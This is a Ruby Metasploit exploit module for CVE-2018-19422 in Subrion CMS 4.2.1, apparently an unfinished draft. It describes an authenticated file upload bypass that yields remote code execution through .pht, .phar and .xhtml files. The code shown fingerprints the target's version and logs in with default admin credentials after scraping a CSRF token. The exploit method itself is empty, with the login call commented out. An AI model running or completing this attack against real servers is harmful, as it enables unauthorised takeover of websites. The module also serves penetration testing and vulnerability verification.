##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Intelliants Subrion CMS 4.2.1 - Authenticated File Upload Bypass to RCE',
        'Description' => %q{
          This module exploits an authenticated file upload vulnerability in
          Subrion CMS versions 4.2.1 and lower. The vulnerability is caused by
          the .htaccess file not preventing the execution of .pht, .phar, and
          .xhtml files. Files with these extensions are not included in the
          .htaccess blacklist, hence these files can be uploaded and executed
          to achieve remote code execution.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Hexife',             # Original discovery, PoC, and CVE submission
          'Fellipe Oliveira',   # ExploitDB author
          'Ismail E. Dawoodjee' # Metasploit module author
        ],
        'References' => [
          [ 'CVE', '2018-19422' ],
          [ 'EDB', '49876' ],
          [ 'URL', 'https://github.com/intelliants/subrion/issues/801' ],
          [ 'URL', 'https://github.com/intelliants/subrion/issues/840' ],
          [ 'URL', 'https://github.com/advisories/GHSA-73xj-v6gc-g5p5' ]
        ],
        'Platform' => ['bsd', 'unix', 'linux', 'win'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Targets' => [ ['Automatic', {} ] ],
        'Privileged' => false,
        'DisclosureDate' => '2018-11-04',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        }
      )
    )
    register_options(
      [
        Opt::RPORT(80, true, 'Subrion CMS default port'),
        OptString.new('TARGETURI', [true, 'Base path', '/']),
        OptString.new('USERNAME', [ true, 'Username to authenticate with', 'admin']),
        OptString.new('PASSWORD', [ true, 'Password to authenticate with', 'admin'])
      ]
    )
  end

  def check
    uri = normalize_uri(target_uri.path, 'panel/') # requires a trailing forward slash
    url_login = "http://#{datastore['RHOST']}:#{datastore['RPORT']}#{uri}"
    print_status("Checking target web server for a response at: #{url_login}")
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => uri
    })

    unless res
      return CheckCode::Unknown('Target did not respond to check request.')
    end

    unless res.code == 200 && res.body.downcase.include?('subrion')
      return CheckCode::Unknown('Target is not running Subrion CMS.')
    end

    print_good('Target is running Subrion CMS.')

    print_status('Checking Subrion CMS version...')
    version = res.body.match('Powered by <a href=.*')
    version_number = version.to_s.split.last.scan(/\d+/).join('.') if version

    unless version_number
      return CheckCode::Detected('Subrion CMS version cannot be determined.')
    end

    print_good("Target is running Subrion CMS Version #{version_number}.")

    if Rex::Version.new(version_number) <= Rex::Version.new('4.2.1')
      print_warning(
        'This version check does not guarantee that the target is vulnerable, ' \
        'since a fix for the vulnerability can easily be applied by a web admin.'
      )
      return CheckCode::Appears
    end

    return CheckCode::Safe
  end

  def login
    print_status('Connecting to Subrion Admin Panel login page to obtain CSRF token...')

    # Session cookies need to be kept to preserve the CSRF token across multiple requests
    uri = normalize_uri(target_uri.path, 'panel/')
    url_login = "http://#{datastore['RHOST']}#{uri}"
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => uri,
      'keep_cookies' => true
    })

    # <input type="hidden" name="__st" value="CA0S3w50vz1zRpdgZl98JAMVrimiXI63lKtxAwyi">
    %r{name="__st" value="(?<csrf_token>[\w+=/]+)">} =~ res.body
    fail_with(Failure::NotFound, "#{peer} - Failed to get CSRF token.") if csrf_token.nil?

    print_good("Successfully obtained CSRF token: #{csrf_token}")

    print_status("Logging in to Subrion Admin Panel at: #{url_login}")
    auth = send_request_cgi({
      'method' => 'POST',
      'uri' => uri,
      'keep_cookies' => true,
      'vars_post' => {
        '__st' => csrf_token,
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }
    })

    %r{name="__st" value="(?<csrf_token_auth>[\w+=/]+)">} =~ auth.body
    if csrf_token == csrf_token_auth && auth.body.downcase.include?('administrator')
      print_good('Successfully logged in as Administrator.')
    else
      fail_with(Failure::BadConfig, "#{peer} - Failed to log in, invalid credentials.")
    end

    return csrf_token
  end

  def exploit
    # csrf_token = login
  end

end
